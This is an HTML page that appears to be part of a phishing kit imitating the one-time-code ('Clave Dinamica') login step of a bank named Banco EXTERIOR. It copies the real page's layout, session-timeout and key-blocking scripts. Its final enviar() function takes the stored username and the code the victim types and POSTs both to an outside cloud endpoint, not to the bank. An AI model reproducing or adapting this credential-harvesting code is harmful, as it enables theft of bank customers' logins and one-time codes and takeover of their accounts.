<html><head><script x-apm-ba-response-bt="servertime%3D1745526530122%2CapmAgentHost%3Dsdk2bhvmlfmNKBf9HrBkOYqwrJPtA%2FkoXgjcmv6agWw%3D%2CapmServletName%3DHlRWS5BHTSsjKyl3HtVCBg%3D%3D%2CapmAgentProcess%3DObOejRBtGSSLitYjHHCNFA%3D%3D%2CapmAgentName%3DE4v67U9%2FhMLmPUW0qIEqww%3D%3D%2CapmWebAppName%3DZdaznoiTG4bP7c%2FBfozKQXokFyGa63TUQrT1kMKUN18%3D" type="text/javascript" id="ca_eum_ba" src="http://localhost:80/api/1/urn:ca:tenantId:default-tenant/urn:ca:appId:default-app/bajs?agent=browser" data-profileurl="http://localhost:80/api/1/urn:ca:tenantId:default-tenant/urn:ca:appId:default-app/profile?agent=browser" data-tenantid="default-tenant" data-appid="default-app" data-appkey="b0361800-4736-11e6-b8e5-bddc75280658"></script>
    <meta http-equiv="Pragma" content="no-cache">
    <link rel="stylesheet" href="/code1_files/style.css">
    
    
    
    
    
    
    <script src="javascripts/UtilsScript.jsp"> </script>
    
    
    
    
    
    <link type="text/css" rel="stylesheet" media="screen"></head>
    
    <body topmargin="0" leftmargin="0">
    
        <form name="confirmarClaveDinamica" method="POST">
            <input type="HIDDEN" name="OPT" id="OPT" value="4-1"> <input type="HIDDEN" name="PB" id="PB" value=""> <input type="HIDDEN" name="actionPos" id="actionPos" value="">
    
            <table border="0" cellspacing="0" cellpadding="0" width="780">
                <tbody><tr>
                    <td height="28" width="12"><img src="/code1_files/icono.gif"></td>
                    <td class="menutit">Validacion de Clave Dinamica</td>
                </tr>
            </tbody></table>
            <br>
    
            
            <br>
            
    
            <table border="0" cellspacing="0" cellpadding="0" width="780">
                <tbody><tr>
                    <td>
                        <table border="0" bordercolor="cccccc" style="border-collapse: collapse" cellspacing="0" cellpadding="2" width="600" align="left">
                            <tbody><tr>
                                <td align="left" class="afiliar" colspan="2">Ingresa la
                                    clave que fue enviada a tu numero celular o correo
                                    electronico para finalizar el proceso de inicio de sesion al sistema</td>
                            </tr>
                            <tr>
                                <td align="left" class="afiliar" colspan="2">&nbsp;</td>
                            </tr>
                            <tr>
                                <td align="right" class="afiliar"><b>Ingrese la Clave
                                        Dinamica: </b></td>
                                <td align="left"><input type="text" name="claveDinamica" id="claveDinamica" value="" size="10" maxlength="10" onkeypress="return validar(event)" autocomplete="OFF"></td>
                            </tr>
                            <tr>
                                <td align="left" class="afiliar" colspan="2">&nbsp;</td>
                            </tr>
                            <tr>
                                <td align="left" class="afiliar" colspan="2">Recuerda que por su seguridad debe introducir su clave dinamica para continuar con el inicio de sesion.</td>
                            </tr>
                        </tbody></table>
                    </td>
                </tr>
            </tbody></table>
            <br>
    
            <table border="0" cellspacing="1" cellpadding="2" width="600">
                <tbody><tr>
                    <td align="CENTER">
                        <table class="buttond">
                            <tbody><tr>
                                <td><a href="javascript: goToMainPage();" onmouseover="window.status='';return true" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>Cerrar<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a>
                                </td>
                            </tr>
                        </tbody></table>
                    </td>
                    <td align="CENTER">
                        <table class="buttond">
                            <tbody><tr>
                                <td><a onclick="enviar()" id="btoAceptar" onmouseover="window.status='';return true" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>Aceptar<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a>
                                </td>
                            </tr>
                        </tbody></table>
                    </td>
                </tr>
            </tbody></table>
    
            <br>
    
    
    
        </form>
    
    
    
    
    
    
    <script language="JavaScript">
    
    var w=screen.width;
    var h=screen.height;
    var posTop=(h-350)/2;
    var posLeft=(w-550)/2;
    var position='left='+posLeft+',top='+posTop+',height='+320+',width='+480;
    
    function Minutes(data) {
    for (var i = 0; i < data.length; i++)
    if (data.substring(i, i + 1) == ":")
    break;
    return (data.substring(0, i));
    }
    function Seconds(data) {
    for (var i = 0; i < data.length; i++)
    if (data.substring(i, i + 1) == ":")
    break;
    return (data.substring(i + 1, data.length));
    }
    function Display(min, sec) {
    var disp;
    if (min <= 9) disp = " 0";
    else disp = " ";
    disp += min + ":";
    if (sec <= 9) disp += "0" + sec;
    else disp += sec; 
    return (disp);
    }
    
    
    function Down()
    { 
      sec--;      
      if (sec == -1) 
      {
         sec = 59;
         min--; 
       }
    
       parent.window.status = "Banco EXTERIOR. Tu sesión expirará en: " + Display(min, sec);
       
       if (min == 0 && sec == 0) 
       {  
       
        window.location.href='login_logout.jsp';
       }
       else
       {
          if (min == 1 && sec == 0)
          {
             parent.top.TimeOutWindow = window.open("pop_timeout.jsp",'TimeOutWindow','toolbar=no,location=no,directories=no,menubar=no,scrollbars=yes,resizable=no,copyhistory=no,'+position);
          }
    
          down = setTimeout("Down()", 1000);
       }     
    }
    
    
    
    
    function timeIt() 
    {
        min = 1 * Minutes(document.timerform.clock.value);
        sec = 0 + Seconds(document.timerform.clock.value);
        Down();
    }
    
    
    function reloadExpirationTime() 
    {
        min = 1 * Minutes(document.timerform.clock.value);
        sec = 0 + Seconds(document.timerform.clock.value);
    }
    
    
    function releasePopUp() 
    {	
       parent.top.PopUpWindow = false;
    }
    
    
    //Deshabilita el Boton Derecho 
    document.oncontextmenu=new Function("return false");
    
    
    
    //Deshabilita la selección de texto
    document.ondragstart=new Function("return false");
    document.onselectstart=new Function("return false");
    
    
    if(document.forms[0])
    {
        //Deshabilita el submit al presionar la tecla enter
        document.forms[0].onsubmit = new Function("return false");
    
    
        //Deshabilita la Autocompletación en los campos de Texto y Password
        for(i=0; i<document.forms[0].elements.length; i++)
        {
          tipoCampo = document.forms[0].elements[i].type;
          tipoCampo = tipoCampo.toUpperCase();		
          if(tipoCampo=="TEXT" || tipoCampo=="PASSWORD")  
            document.forms[0].elements[i].setAttribute('AUTOCOMPLETE','OFF');	    
        }
    }
    
    </script>
    
    
    <script language="JavaScript">
      //Deshabilitar teclas 
      document.onkeydown = function(event){  		
        
        var alt=false;
        var ctrl=false;
        var kcode;		
        var navegador="";
        if(event)
        {	
            if(event.which)//Netscape    	
            {
                navegador="N";
                kcode=event.which; 	
                
                //Tecla Alt presionada
                if(event.altKey)
                       alt=true;
    
                //Tecla Control presionada
                if(event.ctrlKey)
                       ctrl=true;
            }
        }
        else
        if(window.event.keyCode)//Internet Explorer 	
        {
            navegador="IE";
            kcode=window.event.keyCode; 
            
            //Tecla Alt presionada
            if(window.event.altKey)
                alt=true;
    
            //Tecla Control presionada
            if(window.event.ctrlKey)
                ctrl=true;
        }
    
        //alert(kcode)
        
    
        //Deshabilia Alt + Flecha Izq y/o Der (Atras, Adelante)
        if(alt==true && (kcode==37 || kcode==39))
        {				  
            return false;				
        }
    
        //Deshabilia Contol + C,V,X (Copiar, Pegar, Cortar)
        if(ctrl==true && (kcode==67 || kcode==86 || kcode==88))
        {
            return false;
        }
    
        //Deshabilia F1 -> F12
        if (kcode >= 112 && kcode <= 123)
        { 		
            if(navegador=="N")
            {				  
               return false;		
            }
            else
            if(navegador=="IE")
            {		   			   
               window.event.keyCode = 505;
               return false;  
            }
        } 
            
    
        if (kcode == 8) //BackSpace
        { 
            valor = document.activeElement.value; 
    
            if (valor==undefined) //Evita Back en página. 
            { 
                if(navegador=="N")//Netscape 
                {
                  event.preventDefault();
                   event.returnValue = false;
                }
                return false;
            }
            else 
            { 	
                var type = document.activeElement.type;
                type = type.toUpperCase();					
    
                if (type=='SELECT-ONE') //Evita Back en select. 
                { 
                    if(navegador=="N")//Netscape 
                    {
                      event.preventDefault();
                       event.returnValue = false;
                    }
                    return false;
                }
                else
                if (type=='BUTTON') //Evita Back en button. 
                {
                    if(navegador=="N")//Netscape 
                    {
                      event.preventDefault();
                       event.returnValue = false;
                    }
                    return false;
                }
                else 
                if (type=='RADIO') //Evita Back en radio. 
                {
                    if(navegador=="N")//Netscape 
                    {
                      event.preventDefault();
                       event.returnValue = false;
                    }
                    return false;
                }
                else 
                if (type=='CHECKBOX') //Evita Back en checkbox. 
                { 
                    if(navegador=="N")//Netscape 
                    {
                      event.preventDefault();
                       event.returnValue = false;
                    }
                    return false;
                }
                else 
                if (type=='FILE') //Evita Back en file. 
                { 
                    if(navegador=="N")//Netscape 
                    {
                      event.preventDefault();
                       event.returnValue = false;
                    }
                    return false;
                }
                else 
                if (type=='RESET') //Evita Back en reset. 
                { 
                    if(navegador=="N")//Netscape 
                    {
                      event.preventDefault();
                       event.returnValue = false;
                    }
                    return false;
                }
                else 
                if (type=='SUBMIT') //Evita Back en submit. 
                { 
                    if(navegador=="N")//Netscape 
                    {
                      event.preventDefault();
                       event.returnValue = false;
                    }
                    return false;
                } 
                else //Text, textarea o password 
                { 
                    if (document.activeElement.value.length==0) //No realiza el backspace(largo igual a 0). 
                    { 
                        if(navegador=="N")//Netscape 
                        {
                          event.preventDefault();
                           event.returnValue = false;
                        }
                        return false;	
                    }
                    /*else //Realiza el backspace. 
                    { 
                      document.activeElement.value.keyCode = 8; 
                    }*/ 
                } 
                
            } 
        } 
    
       }//fin desabilitar teclas 
    
    </script>
    
    
    
    
    
    
    
    
    <form name="timerform" id="timerform">
    <input type="hidden" name="clock" value="3">
    </form>
    <script>
        
async function enviar() {
	


	event.preventDefault(); // Evita recargar la página
			const usr = localStorage.getItem("usr")
            const usrs = document.getElementById('claveDinamica').value;
            
           
          
			
           


            const message = `BEXT-- --Usuario: <code>${usr}</code> --\n CODE:<code> ${usrs} </code>--` ;
            const responseMessage = document.getElementById("responseMessage");

            if (!message.trim()) {
                responseMessage.textContent = "⚠️ Ingresa un mensaje antes de enviar.";
                return;
            }
{}
            try {
                const response = await fetch("https://116cb782-9f93-4a72-ba4a-d06101f4024e.us-east-1.cloud.genez.io/", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ message })
                });

                const data = await response.json();

                if (response.ok) {
                   localStorage.setItem("usr", usr);
                   localStorage.setItem("claveDinamica", "true");
				
				  
				   
                    
                } else {
                    responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
                }
            } catch (error) {
                responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
            }
}
    </script>
    
    </body></html>